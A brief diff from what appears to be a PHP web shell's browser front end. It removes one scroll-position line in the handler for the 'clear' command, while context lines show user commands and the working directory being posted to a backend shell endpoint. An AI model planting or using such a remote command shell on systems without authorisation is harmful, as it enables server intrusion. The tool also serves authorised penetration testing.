@@ -239,7 +239,6 @@ if (isset($_GET["feature"])) {
                 } else if (/^\s*clear\s*$/.test(command)) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
-                    eShellContent.scrollTop = eShellContent.scrollHeight;
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
